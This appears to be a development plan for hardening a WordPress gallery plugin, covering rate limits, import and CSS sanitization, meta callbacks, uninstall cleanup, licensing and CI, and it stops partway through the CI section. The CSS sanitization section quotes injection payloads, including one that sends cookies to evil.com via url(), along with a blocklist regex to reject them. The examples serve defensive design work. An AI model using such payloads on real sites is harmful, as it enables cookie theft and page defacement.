# Phase 20 — Production Hardening, CI Pipeline & Distribution Readiness

**Status:** In progress (Sprint 1 complete, H-track 12/12, P20-B/E/F/I/L/J complete, QA Rounds 2–7 applied)
**Version:** v0.18.0 (planned)
**Created:** March 4, 2026
**Last updated:** March 9, 2026 — P20-I (CPT migration, media index, cache versioning, lazy dockview, async email, shared root)

### Completed

| Track | Commit | Result |
|-------|--------|--------|
| P20-A | feat/phase20-prod-readiness | Public default 60 req/min, authenticated 120 req/min, filter overrides, 7 PHPUnit tests |
| P20-B | feat/phase20-prod-readiness | import_campaign() routed through sanitize_template_data(), slots/overlays/background/layoutBinding all sanitized, 10 PHPUnit tests |
| P20-C | feat/phase20-prod-readiness | `sanitize_css_value()` with type-specific allowlists (color, clip-path, position), universal blocklist, 4 call sites updated, 34 PHPUnit tests |
| P20-D | feat/phase20-prod-readiness | `sanitize_callback` on all 7 REST-exposed post meta fields, 5 sanitize methods, 8 PHPUnit tests |
| P20-E | feat/phase20-prod-readiness | uninstall.php with 9-category cleanup (posts, terms, options, transients, tables, roles, cron, files), preserve_data_on_uninstall setting |
| P20-F | feat/phase20-prod-readiness | GPLv2 LICENSE at repo root and plugin dir, complete plugin header with all WordPress.org required fields |
| P20-K | feat/phase20-prod-readiness | JWT gated behind `WPSG_ENABLE_JWT_AUTH`, nonce-only default, `useNonceHeartbeat` hook, `/nonce` endpoint, cookie-based `/auth/login` and `/auth/logout` REST endpoints, in-app LoginForm modal retained for nonce mode (no wp-login.php redirect), 12 Vitest tests, 6 AuthContext tests, 11 PHPUnit tests |
| P20-H (12/12) ✅ | feat/phase20-prod-readiness | H-1 (parseProps whitelist), H-2 (DNS rebinding SSRF fix), H-3 (nonce bypass hardened), H-4 (no password reset URL exposure), H-5 (overlay file deletion), H-6 (Sentry PII scrubbing), H-7 (CSP headers), H-8 (ErrorBoundary → Sentry), H-9 (apiClient 30s timeout + AbortController), H-10 (status/visibility whitelist), H-11 (encodeURIComponent), H-12 (console.info DEV guard) |
| P20-L | feat/phase20-prod-readiness | `enshrined/svg-sanitize` in composer, server-side sanitization in `handle_upload()`, custom CSS validator (`sanitize_svg_css`), URI allowlist (`sanitize_svg_uris`), `.htaccess` CSP headers for overlay dir, 24 PHPUnit tests. Client-side DOMPurify N/A — all overlays rendered via `<img>` tags (inherently safe). |
| P20-J | feat/phase20-prod-readiness | J-1: `readme.txt` in WP.org format (description, FAQ, changelog 0.12–0.17). J-3: composer dev deps separated. J-4: `capability_type => wpsg_campaign` with `map_meta_cap`, 10 CPT caps granted to admin/wpsg_admin roles, uninstall cleanup. J-2: `load_plugin_textdomain()` added, CPT/taxonomy/role labels wrapped with `__()`; languages/ dir created. REST API strings (~119) deferred to follow-up. |
| P20-I | `32b32ca` | I-1: Layout templates migrated from `wp_options` to `wpsg_layout_tpl` CPT with auto-migration + UUID backward compat. I-2: `wpsg_media_refs` reverse-index table (DB v3) with auto-sync via meta hooks; replaces full-table scans. I-3: Cache version counter replaces 4 LIKE DELETEs per mutation. I-4: `React.lazy()` for LayoutBuilderModal + PresetGalleryModal — admin chunk 504→327 KB. I-5: Async email queue + 1-min cron dispatch. I-6: Shared React root via `createPortal` behind `sharedRoot` feature flag (default off). |

---

## Table of Contents

- [Phase 20 — Production Hardening, CI Pipeline \& Distribution Readiness](#phase-20--production-hardening-ci-pipeline--distribution-readiness)
    - [Completed](#completed)
  - [Table of Contents](#table-of-contents)
  - [Rationale](#rationale)
  - [Key Decisions (Pre-Resolved)](#key-decisions-pre-resolved)
  - [Architecture Decisions](#architecture-decisions)
  - [Track P20-A — Rate Limiting Defaults](#track-p20-a--rate-limiting-defaults)
    - [Problem](#problem)
    - [Changes](#changes)
    - [Implementation detail](#implementation-detail)
    - [Acceptance criteria](#acceptance-criteria)
  - [Track P20-B — Import Payload Deep Sanitization](#track-p20-b--import-payload-deep-sanitization)
    - [Problem](#problem-1)
    - [Tasks](#tasks)
    - [Architecture note](#architecture-note)
    - [Acceptance criteria](#acceptance-criteria-1)
  - [Track P20-C — CSS Value Sanitization](#track-p20-c--css-value-sanitization)
    - [Problem](#problem-2)
    - [Shared helper](#shared-helper)
    - [Implementation sketch](#implementation-sketch)
    - [Files](#files)
    - [Acceptance criteria](#acceptance-criteria-2)
  - [Track P20-D — Post Meta Sanitize Callbacks](#track-p20-d--post-meta-sanitize-callbacks)
    - [Problem](#problem-3)
    - [Changes](#changes-1)
    - [Alternative approach](#alternative-approach)
    - [Acceptance criteria](#acceptance-criteria-3)
  - [Track P20-E — Uninstall Cleanup](#track-p20-e--uninstall-cleanup)
    - [Problem](#problem-4)
    - [File: `wp-plugin/wp-super-gallery/uninstall.php` (new)](#file-wp-pluginwp-super-galleryuninstallphp-new)
    - [Cleanup targets](#cleanup-targets)
    - [Settings UI addition](#settings-ui-addition)
    - [Acceptance criteria](#acceptance-criteria-4)
  - [Track P20-F — License, Headers \& Legal](#track-p20-f--license-headers--legal)
    - [Tasks](#tasks-1)
    - [Acceptance criteria](#acceptance-criteria-5)
  - [Track P20-G — GitHub Actions CI Pipeline](#track-p20-g--github-actions-ci-pipeline)
    - [Problem](#problem-5)
    - [Pipeline architecture](#pipeline-architecture)
      - [`.github/workflows/ci.yml`](#githubworkflowsciyml)
    - [Branch protection](#branch-protection)
    - [Handling legacy CircleCI](#handling-legacy-circleci)
    - [Acceptance criteria](#acceptance-criteria-6)
  - [Track P20-H — Security Hardening Sprint](#track-p20-h--security-hardening-sprint)
    - [H-1. Whitelist props in `parseProps()` \[Trivial\]](#h-1-whitelist-props-in-parseprops-trivial)
    - [H-2. Fix DNS rebinding in oEmbed SSRF protection \[Medium — 3–4 hours\]](#h-2-fix-dns-rebinding-in-oembed-ssrf-protection-medium--34-hours)
    - [H-3. Remove nonce bypass filter \[Trivial\]](#h-3-remove-nonce-bypass-filter-trivial)
    - [H-4. Stop exposing password reset URL in API response \[Trivial\]](#h-4-stop-exposing-password-reset-url-in-api-response-trivial)
    - [H-5. Delete physical files on overlay removal \[Small — 30 min\]](#h-5-delete-physical-files-on-overlay-removal-small--30-min)
    - [H-6. Add Sentry PII scrubbing \[Small — 1–2 hours\]](#h-6-add-sentry-pii-scrubbing-small--12-hours)
    - [H-7. Set default Content Security Policy \[Medium — 2–3 hours\]](#h-7-set-default-content-security-policy-medium--23-hours)
    - [H-8. Implement `ErrorBoundary` → Sentry integration \[Small — 30 min\]](#h-8-implement-errorboundary--sentry-integration-small--30-min)
    - [H-9. Add request timeout to `apiClient` \[Small — 30 min\]](#h-9-add-request-timeout-to-apiclient-small--30-min)
    - [H-10. Whitelist `status`/`visibility` filter values \[Trivial\]](#h-10-whitelist-statusvisibility-filter-values-trivial)
    - [H-11. Consistently `encodeURIComponent` dynamic URL segments \[Small — 1 hour\]](#h-11-consistently-encodeuricomponent-dynamic-url-segments-small--1-hour)
    - [H-12. Gate `console.info` behind DEV check \[Trivial\]](#h-12-gate-consoleinfo-behind-dev-check-trivial)
    - [Track P20-H acceptance criteria (aggregate)](#track-p20-h-acceptance-criteria-aggregate)
  - [Track P20-I — Performance Optimizations](#track-p20-i--performance-optimizations)
    - [I-1. Migrate layout templates to CPT storage \[Large — 1–2 days\]](#i-1-migrate-layout-templates-to-cpt-storage-large--12-days)
    - [I-2. Implement media usage reverse index \[Medium — 4–6 hours\]](#i-2-implement-media-usage-reverse-index-medium--46-hours)
    - [I-3. Replace LIKE-based cache invalidation \[Small — 1–2 hours\]](#i-3-replace-like-based-cache-invalidation-small--12-hours)
    - [I-4. Lazy-load dockview \[Small — 1–2 hours\]](#i-4-lazy-load-dockview-small--12-hours)
    - [I-5. Async alert email dispatch \[Small — 1–2 hours\]](#i-5-async-alert-email-dispatch-small--12-hours)
    - [I-6. Shared React root for multi-shortcode pages \[Medium — 3–5 hours\]](#i-6-shared-react-root-for-multi-shortcode-pages-medium--35-hours)
    - [Track P20-I acceptance criteria (aggregate)](#track-p20-i-acceptance-criteria-aggregate)
  - [Track P20-J — Plugin Directory Preparation](#track-p20-j--plugin-directory-preparation)
    - [J-1. Create `readme.txt` \[Medium — 2–3 hours\]](#j-1-create-readmetxt-medium--23-hours)
    - [J-2. Add i18n support \[Medium-Large — 1–2 days\]](#j-2-add-i18n-support-medium-large--12-days)
    - [J-3. Separate Composer dev dependencies \[Trivial — 15 min\]](#j-3-separate-composer-dev-dependencies-trivial--15-min)
    - [J-4. Implement custom capability type for CPT \[Small — 1–2 hours\]](#j-4-implement-custom-capability-type-for-cpt-small--12-hours)
    - [Track P20-J acceptance criteria (aggregate)](#track-p20-j-acceptance-criteria-aggregate)
  - [Track P20-K — JWT Auth Hardening (Nonce-Only Default)](#track-p20-k--jwt-auth-hardening-nonce-only-default)
    - [Problem](#problem-6)
    - [Approach](#approach)
    - [Tasks](#tasks-2)
    - [Acceptance criteria](#acceptance-criteria-7)
  - [Layout Builder QA — Round 2 Fixes](#layout-builder-qa--round-2-fixes)
    - [Bug Fixes](#bug-fixes)
    - [UX Improvements](#ux-improvements)
    - [Type \& Backend Changes](#type--backend-changes)
  - [Track P20-L — SVG Upload Sanitization (Dual-Layer)](#track-p20-l--svg-upload-sanitization-dual-layer)
    - [Problem](#problem-7)
    - [Approach — Dual-layer sanitization](#approach--dual-layer-sanitization)
    - [Custom CSS sanitization within SVG `<style>` blocks](#custom-css-sanitization-within-svg-style-blocks)
    - [Allowlist-based URI validation](#allowlist-based-uri-validation)
    - [Tasks](#tasks-3)
    - [Re-serialization as polyglot mitigation](#re-serialization-as-polyglot-mitigation)
    - [Acceptance criteria](#acceptance-criteria-8)
  - [Execution Priority](#execution-priority)
  - [Testing Strategy](#testing-strategy)
  - [Risk Register](#risk-register)
  - [Modified File Inventory (projected)](#modified-file-inventory-projected)
    - [New files](#new-files)
    - [Modified files](#modified-files)
  - [Layout Builder QA — Round 3 Features](#layout-builder-qa--round-3-features)
    - [1. Advanced Gradient Controls](#1-advanced-gradient-controls)
    - [2. Mask Sub-Layer System](#2-mask-sub-layer-system)
    - [3. Image Effects System (5 Categories)](#3-image-effects-system-5-categories)
    - [4. PHP Sanitization](#4-php-sanitization)
    - [Type Changes](#type-changes)
  - [Layout Builder QA — Round 5 Changes](#layout-builder-qa--round-5-changes)
    - [1. Bug Fixes](#1-bug-fixes)
    - [2. Per-Slot Glow Color \& Spread](#2-per-slot-glow-color--spread)
    - [3. Mask Sublayer UX Overhaul](#3-mask-sublayer-ux-overhaul)
    - [4. Layout Canvas Height Flexibility](#4-layout-canvas-height-flexibility)
    - [5. Mobile Breakpoint Guard](#5-mobile-breakpoint-guard)
    - [6. URL Image Input Removal](#6-url-image-input-removal)
    - [7. Documentation Updates](#7-documentation-updates)
    - [Type \& Backend Changes (Round 5)](#type--backend-changes-round-5)
  - [Layout Builder QA — Round 6 Changes](#layout-builder-qa--round-6-changes)
    - [A. Mask Layer Fixes](#a-mask-layer-fixes)
    - [B. Background Panel](#b-background-panel)
    - [C. Design Assets \& Drag-and-Drop](#c-design-assets--drag-and-drop)
    - [New \& Refactored Files (Round 6)](#new--refactored-files-round-6)
  - [Security Hardening Sprint — Round 7 Changes](#security-hardening-sprint--round-7-changes)

---

## Rationale

Phase 19 completed the builder power-tools sprint (keyboard shortcuts, undo/redo hardening, WP-CLI, pre-commit toolchain, coverage recovery to 65 %). A comprehensive production readiness evaluation (see [PRODUCTION_READINESS_EVALUATION.md](PRODUCTION_READINESS_EVALUATION.md)) then identified 2 CRITICAL, 7 HIGH, 12 MEDIUM, and 15+ LOW findings across security, reliability, performance, and distribution readiness. Phase 20 addresses them systematically:

**1 — Public endpoints have no default rate limiting.** `apply_filters('wpsg_rate_limit_public', 0)` means the plugin ships with rate limiting effectively disabled. Any automated script can exhaust server resources. This is a CRITICAL fix requiring a single line change plus sensible defaults.

**2 — Import payloads bypass deep sanitization.** `import_campaign()` accepts the full campaign JSON but only applies shallow sanitization. Slots, graphic layers, background objects, and layout bindings are not routed through the same sanitizers used by the normal save path. An attacker with `manage_wpsg` capability can inject stored XSS via a crafted JSON import.

**3 — CSS values in layout templates are insufficiently validated.** `sanitize_text_field()` strips HTML tags but does not prevent CSS injection via `url()`, `expression()`, or `;` in `clipPath`, `borderColor`, and `objectPosition` fields. These values are rendered inside Shadow DOM style attributes.

**4 — `register_post_meta` calls lack `sanitize_callback`.** The native WP REST API (`POST /wp/v2/wpsg_campaign/{id}`) can write arbitrary values to campaign meta fields because no per-field sanitization is registered. This bypasses all plugin-side validation.

**5 — No uninstall cleanup.** Plugin deactivation + deletion leaves custom tables, post types, taxonomy terms, options, cron hooks, and uploaded files behind. WordPress.org plugin review guidelines require clean uninstallation.

**6 — Missing LICENSE file and plugin header fields.** Both are hard requirements for WordPress.org directory submission and the absence of a license creates legal ambiguity for users.

**7 — No CI pipeline for frontend code.** The existing CircleCI config targets PHP 5.6–7.4, which doesn't match the PHP 8.0+ requirement. Frontend (ESLint, TypeScript, Vitest, Playwright) has zero CI coverage. A GitHub Actions pipeline covering both stacks is needed to gate PRs.

**8 — 12 security hardening items remain.** Props whitelisting, DNS rebinding protection, nonce bypass filter removal, password reset URL exposure, overlay file deletion, Sentry PII scrubbing, CSP headers, ErrorBoundary→Sentry integration, request timeouts, status/visibility whitelisting, URL encoding, and console gating. None individually block release, but collectively they represent significant attack surface.

**9 — Performance optimizations for scale.** Layout template storage in `wp_options` (O(N) reads), full-table scans for media usage, LIKE-based cache invalidation, eagerly loaded dockview bundle, synchronous alert emails, and per-shortcode React roots. These become bottlenecks at production scale.

**10 — Plugin directory submission prerequisites.** `readme.txt`, i18n support, composer dev dependency separation, and custom capability types for the CPT are required or strongly recommended for WordPress.org listing.

---

## Key Decisions (Pre-Resolved)

| # | Decision | Resolution |
|---|----------|------------|
| A | JWT auth hardening (A-1 from action items) | **Option 1 — Drop JWT for same-origin, WP nonce-only.** Comment out (not delete) JWT code paths for future standalone SPA use; gate behind `WPSG_ENABLE_JWT_AUTH` constant. Option 2 (in-memory tokens + refresh cookie) recorded in [FUTURE_TASKS.md](FUTURE_TASKS.md) for the non-WP-plugin version. See [JWT_AUTH_ANALYSIS.md](JWT_AUTH_ANALYSIS.md). |
| B | SVG upload handling (A-3 from action items) | **Option 2 — Server-side sanitization via `enshrined/svg-sanitize` + client-side DOMPurify dual layer.** Custom CSS sanitization within SVG `<style>` blocks (allowlist-based URI validation). Frontend renders SVGs as `<img>`. See [SVG_UPLOAD_ANALYSIS.md](SVG_UPLOAD_ANALYSIS.md). |
| C | Phase execution order | Security-critical fixes first (P20-A through P20-D), then infrastructure (P20-E through P20-G), then hardening (P20-H), then performance and distribution (P20-I, P20-J). |
| D | CI platform | GitHub Actions (not CircleCI). The existing `.circleci/config.yml` will be archived, not deleted, until the migration is validated. |
| E | Rate limit default value | 60 requests/minute/IP for public endpoints; 120/minute for authenticated endpoints. Configurable via `wpsg_rate_limit_public` and `wpsg_rate_limit_authenticated` filters. |
| F | Uninstall data strategy | Full cleanup by default. Add a `wpsg_preserve_data_on_uninstall` option (default: `false`) that users can enable via Settings → Advanced before uninstalling if they want to keep data. |
| G | License | GPLv2 or later — required by WordPress.org and compatible with all WP ecosystem code. |
| H | CSS sanitization approach | Allowlist-based validation with a shared `wpsg_sanitize_css_value($value, $allowed_pattern)` helper — reject anything not matching the allowed pattern rather than trying to blacklist dangerous patterns. |
| I | B-item grouping | All 12 Phase B items shipped as a single track (P20-H) with individual sub-tasks. Many are trivial; grouping prevents sprint fragmentation. |
| J | Performance track sequencing | C-1 (CPT migration) is the highest-impact change and has a migration path to write. It should be done first within P20-I. C-6 (shared React root) is the riskiest and should be done last. |

---

## Architecture Decisions

| ID | Decision | Rationale |
|----|----------|-----------|
| AD-1 | CSS sanitization via allowlist helper `wpsg_sanitize_css_value()` | Blacklists are inherently bypassable (new CSS features, encoding tricks). An allowlist regex per property type (color, position, clip-path) is future-proof and concise. |
| AD-2 | Import sanitization reuses existing per-field sanitizers, not a separate path | The root cause is that `import_campaign()` has its own inline logic instead of routing through `apply_campaign_meta()` → `WPSG_Layout_Templates::sanitize_slot()`. Fix by refactoring import to call the same functions, not by duplicating sanitization logic. |
| AD-3 | `uninstall.php` over `register_uninstall_hook()` | `uninstall.php` is the WordPress-recommended approach for plugins with significant cleanup. It runs without loading the plugin's classes, which is important if class files become corrupted or incompatible. |
| AD-4 | GitHub Actions matrix: PHP 8.0, 8.1, 8.2, 8.3 × WP latest + WP minimum | Matches the plugin's stated requirements. Four PHP versions × two WP versions = 8 matrix entries. JS pipeline runs once (Node 20 LTS). |
| AD-5 | Cache version counter replaces LIKE-based invalidation | O(1) `update_option` + TTL expiry vs O(N) `DELETE WHERE option_name LIKE`. The version counter pattern is idiomatic in WP and used by WP core for stylesheet versioning. |
| AD-6 | Layout templates CPT migration uses a one-time wp-admin migration notice | A `admin_notices` hook checks `get_option('wpsg_layout_cpt_migrated')`. If missing, it runs the migration and sets the flag. Rollback: a WP-CLI command `wp wpsg migrate-layouts rollback` restores from the backup option. |
| AD-7 | Shared React root via portal pattern | A single `createRoot()` discovers all `.wp-super-gallery` mount points and renders each as a `createPortal()` child. Shared SWR cache + auth context + theme eliminates duplicate network requests and memory overhead on pages with multiple shortcodes. |
| AD-8 | JWT code commented out, not deleted; gated behind `WPSG_ENABLE_JWT_AUTH` | Preserves the JWT framework for future standalone SPA deployment. Commented blocks are clearly marked with `// [WPSG_JWT_DISABLED]` tags for easy re-enablement. The constant check avoids dead-code execution in the default WP plugin path. |
| AD-9 | Dual-layer SVG sanitization: `enshrined/svg-sanitize` (PHP, write-time) + DOMPurify (JS, both upload-preview and render-time) | Server-side sanitization is the security boundary (strips dangerous content before disk); DOMPurify at render-time catches any bypasses that slip through. Two independent sanitizers from different ecosystems provide genuine defence-in-depth. `@font-face` with embedded `data:font/*` URIs is preserved; external font URLs are stripped. |

---

## Track P20-A — Rate Limiting Defaults

**Status:** Not started  
**Priority:** 🔴 Critical — ship-blocking  
**Origin:** Action item A-2  
**Effort:** Small (1 hour)

### Problem

`class-wpsg-rest.php` ~L561:
```php
$limit = intval(apply_filters('wpsg_rate_limit_public', 0));
```

A default of `0` means unauthenticated endpoints (gallery data, oEmbed, public search) accept unlimited requests out of the box. This enables trivial denial-of-service by any automated client.

### Changes

| File | Change |
|------|--------|
| `class-wpsg-rest.php` ~L561 | Change default from `0` to `60` |
| `class-wpsg-rest.php` (authenticated filter) | Add `apply_filters('wpsg_rate_limit_authenticated', 120)` with default `120` |
| `class-wpsg-rate-limiter.php` | Ensure window defaults to 60 seconds if not explicitly configured |

### Implementation detail

```php
// Public endpoints: 60 req/min/IP default
$limit = intval(apply_filters('wpsg_rate_limit_public', 60));

// Authenticated endpoints: 120 req/min/IP default  
$auth_limit = intval(apply_filters('wpsg_rate_limit_authenticated', 120));
```

Both values remain overridable via filters for sites with custom requirements.

### Acceptance criteria

- [ ] Out-of-the-box, public endpoints return HTTP 429 after 60 requests/minute from a single IP
- [ ] Authenticated endpoints return HTTP 429 after 120 requests/minute
- [ ] Existing filter hooks continue to work for custom overrides
- [ ] PHPUnit test verifies default rate limit triggers at threshold

---

## Track P20-B — Import Payload Deep Sanitization

**Status:** ✅ Complete  
**Priority:** 🔴 High — ship-blocking  
**Origin:** Action item A-4  
**Effort:** Small (2–3 hours)

### Problem

`import_campaign()` in `class-wpsg-rest.php` accepts a full campaign JSON payload but does not route it through the same deep sanitizers used by `apply_campaign_meta()` and `WPSG_Layout_Templates::sanitize_slot()`. An authenticated admin could import a crafted JSON file containing `<script>` tags, `javascript:` URIs, or CSS injection values in slot/layer definitions.

### Tasks

1. **Route slots through `sanitize_slot()`** — Iterate `$layout_template['slots']` and call `WPSG_Layout_Templates::sanitize_slot($slot)` for each
2. **Validate background structure** — Type-check keys (`type`, `value`, `opacity`); `sanitize_text_field()` on strings; validate colors via `wpsg_sanitize_css_value()` (from P20-C)
3. **Route graphic layers through slot sanitizer** — Graphic layers share the slot data structure
4. **Sanitize `layoutBinding`** — Route through the existing deep-sanitization code path in `apply_campaign_meta()`
5. **Add PHPUnit test** — Import payload containing `<script>`, `javascript:` URIs, and CSS injection; verify they are stripped/rejected

### Architecture note

Per AD-2, the fix is to refactor `import_campaign()` to call the same functions as the normal save path. Specifically:

```php
// In import_campaign():
foreach ($layout_template['slots'] as &$slot) {
    $slot = WPSG_Layout_Templates::sanitize_slot($slot);
}
// ... same for graphicLayers, background, layoutBinding
```

This ensures any future sanitization improvements automatically apply to imports.

### Acceptance criteria

- [ ] Import payloads with `<script>`, `javascript:` URIs, or CSS injection values in slots/layers are sanitized
- [ ] Import still succeeds for clean payloads (no regression)
- [ ] PHPUnit test covers malicious import payloads
- [ ] Import code path calls the same sanitizers as `apply_campaign_meta()`

---

## Track P20-C — CSS Value Sanitization

**Status:** Not started  
**Priority:** 🔴 High — ship-blocking  
**Origin:** Action item A-5  
**Effort:** Small (2–3 hours)

### Problem

`class-wpsg-layout-templates.php` ~L283–287 uses `sanitize_text_field()` for CSS properties (`clipPath`, `objectPosition`, `borderColor`). This strips HTML tags but allows CSS injection payloads like:

```
borderColor: red; background-image: url(https://evil.com/track?cookie=
clipPath: expression(alert(1))
objectPosition: center; } body { display:none } .x {
```

### Shared helper

Create `wpsg_sanitize_css_value($value, $type)` in a new helper file or within `class-wpsg-layout-templates.php`:

| Type | Allowed patterns |
|------|-----------------|
| `color` | Hex (`#RGB`, `#RRGGBB`, `#RRGGBBAA`), `rgb()`, `rgba()`, `hsl()`, `hsla()`, named CSS colors, `transparent`, `currentColor` |
| `clip-path` | `polygon(...)`, `circle(...)`, `ellipse(...)`, `inset(...)`, `path(...)`, `none` |
| `position` | Keywords (`center`, `top`, `bottom`, `left`, `right`), percentage values, `px`/`em` values |

**Universal rejection:** Any value containing `;`, `url(`, `expression(`, `javascript:`, `\`, or unbalanced parentheses.

### Implementation sketch

```php
function wpsg_sanitize_css_value(string $value, string $type): string {
    $value = trim($value);
    // Universal blocklist
    if (preg_match('/[;\\\\]|url\s*\(|expression\s*\(|javascript\s*:/i', $value)) {
        return '';
    }
    switch ($type) {
        case 'color':
            if (preg_match('/^(#[0-9a-fA-F]{3,8}|rgba?\([^)]+\)|hsla?\([^)]+\)|transparent|currentColor|[a-zA-Z]{3,20})$/', $value)) {
                return $value;
            }
            return '';
        case 'clip-path':
            if (preg_match('/^(none|polygon\([^)]+\)|circle\([^)]+\)|ellipse\([^)]+\)|inset\([^)]+\)|path\([^)]+\))$/i', $value)) {
                return $value;
            }
            return '';
        case 'position':
            if (preg_match('/^(center|top|bottom|left|right|(\d+(\.\d+)?(%|px|em|rem)\s*){1,2})$/i', $value)) {
                return $value;
            }
            return '';
        default:
            return sanitize_text_field($value);
    }
}
```

### Files

| File | Change |
|------|--------|
| `class-wpsg-layout-templates.php` ~L283–287 | Replace `sanitize_text_field()` with `wpsg_sanitize_css_value()` for `clipPath`, `objectPosition`, `borderColor` |
| `class-wpsg-layout-templates.php` (or new helper) | Add `wpsg_sanitize_css_value()` function |

### Acceptance criteria

- [ ] CSS values containing `url()`, `expression()`, `javascript:`, or `;` are rejected (return empty string)
- [ ] Valid color/clip-path/position values pass through unchanged
- [ ] PHPUnit test covers each type with valid and malicious inputs
- [ ] Existing layout templates with clean CSS values are unaffected

---

## Track P20-D — Post Meta Sanitize Callbacks

**Status:** Not started  
**Priority:** 🔴 High — ship-blocking  
**Origin:** Action item A-6  
**Effort:** Small (1–2 hours)

### Problem

`class-wpsg-cpt.php` ~L81–125 calls `register_post_meta()` for `media_items`, `tags`, `cover_image`, `visibility`, `status`, `publish_at`, `unpublish_at` without `sanitize_callback`. This means the native WP REST API (`POST /wp/v2/wpsg_campaign/{id}`) can write arbitrary values to these fields, bypassing all plugin-side validation.

### Changes

| Meta key | `sanitize_callback` |
|----------|---------------------|
| `media_items` | Validate array structure; `esc_url_raw()` on URLs; `sanitize_text_field()` on strings; reject malformed entries |
| `tags` | `array_map('sanitize_text_field', $value)` |
| `cover_image` | `esc_url_raw()` |
| `visibility` | Whitelist: `in_array($value, ['public', 'private'], true) ? $value : 'public'` |
| `status` | Whitelist: `in_array($value, ['draft', 'active', 'archived'], true) ? $value : 'draft'` |
| `publish_at` | Validate datetime format (`Y-m-d\TH:i:s`) or empty string |
| `unpublish_at` | Validate datetime format (`Y-m-d\TH:i:s`) or empty string |

### Alternative approach

For meta fields that should **never** be writable through the native WP REST API (only through custom WPSG endpoints), set `show_in_rest => false`. Additionally, add `auth_callback` on sensitive fields to require `manage_wpsg` capability.

### Acceptance criteria

- [ ] Writing arbitrary values to campaign meta via `POST /wp/v2/wpsg_campaign/{id}` is rejected or sanitized
- [ ] Normal plugin workflows (create/update campaign via WPSG endpoints) are unaffected
- [ ] PHPUnit test attempts to write invalid meta values via the native REST endpoint and verifies rejection

---

## Track P20-E — Uninstall Cleanup

**Status:** ✅ Complete  
**Priority:** 🟡 High  
**Origin:** Action item A-7  
**Effort:** Small–Medium (2–3 hours)

### Problem

Deactivating and deleting the plugin leaves behind custom tables, post types, taxonomy terms, options, cron hooks, and uploaded files. WordPress.org plugin review requires clean uninstallation.

### File: `wp-plugin/wp-super-gallery/uninstall.php` (new)

```php
<?php
if (!defined('WP_UNINSTALL_PLUGIN')) {
    exit;
}

// Respect user preference to preserve data
if (get_option('wpsg_preserve_data_on_uninstall', false)) {
    return;
}
```

### Cleanup targets

| Category | Items to remove |
|----------|----------------|
| **Custom post types** | All `wpsg_campaign` posts + meta, all `wpsg_layout_template` posts + meta |
| **Taxonomies** | All `wpsg_company` terms, all `wpsg_campaign_category` terms |
| **Options** | `wpsg_settings`, `wpsg_db_version`, `wpsg_overlay_library`, `wpsg_thumbnail_cache_index`, `wpsg_oembed_provider_failures`, `wpsg_needs_setup`, `wpsg_preserve_data_on_uninstall`, `wpsg_cache_version` |
| **Transients** | All matching `wpsg_*` pattern |
| **Custom tables** | `{$prefix}wpsg_analytics_events`, `{$prefix}wpsg_access_requests` |
| **Roles & capabilities** | Remove `wpsg_admin` role; remove `manage_wpsg` cap from `administrator` |
| **Cron hooks** | `wpsg_archive_cleanup`, `wpsg_schedule_auto_archive`, `wpsg_thumbnail_cache_cleanup` |
| **Uploaded files** | `wp-content/uploads/wpsg-thumbnails/` directory |

### Settings UI addition

Add a checkbox in Settings → Advanced: "Preserve data on plugin removal" (default: unchecked). This sets the `wpsg_preserve_data_on_uninstall` option.

### Acceptance criteria

- [ ] After uninstall (with option unchecked), zero WPSG-related options, posts, tables, files, or cron hooks remain
- [ ] After uninstall (with option checked), all data is preserved
- [ ] `uninstall.php` starts with `WP_UNINSTALL_PLUGIN` guard
- [ ] Manual test: install → create data → uninstall → verify DB is clean

---

## Track P20-F — License, Headers & Legal

**Status:** ✅ Complete  
**Priority:** 🟡 High  
**Origin:** Action items A-8 + D-4  
**Effort:** Trivial (30 minutes)

### Tasks

1. **Create `wp-plugin/wp-super-gallery/LICENSE`** — Standard GPLv2 text
2. **Update plugin header in `wp-super-gallery.php`** — Add/update:
   ```php
    * License:           GPLv2 or later
    * License URI:       https://www.gnu.org/licenses/gpl-2.0.html
    * Tested up to:      6.7
    * Requires at least: 6.0
    * Text Domain:       wp-super-gallery
    * Domain Path:       /languages
   ```

### Acceptance criteria

- [ ] `LICENSE` file exists in plugin root with GPLv2 text
- [ ] Plugin header contains all required fields for WordPress.org submission
- [ ] `wp plugin list` shows the correct license in local dev

---

## Track P20-G — GitHub Actions CI/CD Pipeline

**Status:** In progress  
**Priority:** 🟡 High  
**Origin:** Action item A-9  
**Effort:** Medium (3–5 hours)

### Problem

- Frontend (ESLint, TypeScript, Vitest) has zero CI coverage
- Legacy CircleCI PHP pipeline targets PHP 5.6–7.4 with PHPUnit 5.7 — completely irrelevant (plugin requires PHP 8.0+, PHPUnit 9). Deleted outright, no archival needed.
- PRs can merge with failing tests, type errors, or lint violations
- No automated release packaging or distribution workflow
- Version bumps are manual and error-prone across 3 files

### Decisions

| Decision | Choice | Rationale |
|----------|--------|-----------|
| CI platform | GitHub Actions | Native to GitHub, free for public repos, no external service |
| PHP matrix | 8.1, 8.2, 8.3 × WP latest | 8.0 is EOL. Multi-WP-version testing adds no value — plugin uses no version-gated WP APIs |
| E2E strategy | Separate `e2e.yml`, manual trigger only (`workflow_dispatch`) | E2E requires full wp-env + Vite + seed data — too heavyweight for every push |
| Release trigger | `workflow_dispatch` with version input (Approach C) | Maximum control, gated options, build-before-publish guarantee, override escape hatch |
| Versioning | SemVer 2.0.0 auto-computed from conventional commits | `feat:` → MINOR, `fix:`/others → PATCH. Pre-1.0: breaking → MINOR (MAJOR reserved for deliberate 1.0.0) |
| Version override | Always available in release workflow input | For deliberate decisions like "this is 1.0.0" |
| SVN deploy | Optional checkbox in release + standalone `svn-deploy.yml` reusing existing release ZIP | 3 paths: during release, after release (reuse proven artifact), or never |
| CircleCI | Deleted entirely | Was temporary, irrelevant to current stack |

### Versioning strategy

**SemVer mapping from conventional commits** (already enforced via commitlint + Husky):

| Commits since last tag contain | Bump (pre-1.0) | Bump (post-1.0) |
|-------------------------------|-----------------|------------------|
| Only `fix:`, `chore:`, `docs:`, `refactor:`, `perf:`, `test:`, `build:`, `ci:`, `style:`, `revert:` | **PATCH** (0.17.0 → 0.17.1) | **PATCH** |
| At least one `feat:` | **MINOR** (0.17.0 → 0.18.0) | **MINOR** |
| Any `!` suffix or `BREAKING CHANGE:` in body | **MINOR** (0.17.0 → 0.18.0) | **MAJOR** |

Auto-computation: a shell script in the release workflow scans commits since the last tag, determines the bump level, and proposes the version. The operator can accept or override.

**Version locations** (all 3 must stay in sync — automated by release workflow):
1. `package.json` → `"version": "X.Y.Z"`
2. `wp-plugin/wp-super-gallery/wp-super-gallery.php` → `Version: X.Y.Z`
